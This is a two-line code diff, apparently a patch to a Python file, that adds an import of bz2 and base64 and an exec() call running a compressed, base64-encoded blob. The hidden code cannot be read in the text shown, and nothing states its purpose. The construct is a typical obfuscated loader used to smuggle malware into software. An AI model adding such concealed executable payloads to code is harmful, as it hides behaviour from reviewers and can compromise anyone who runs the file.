@@ -1,0 +1,2 @@
+import bz2, base64
+exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWUmzeHoAABbZgAAQAHv0YjUl1gAgAEiJpqZNqNoNJo2kKDQGgADR4ZVoC7gHjaFBQMVjG6LW3Kkff1LkZMPviZlvTmMBIWkBpr+LuSKcKEgk2bw9AA==')))
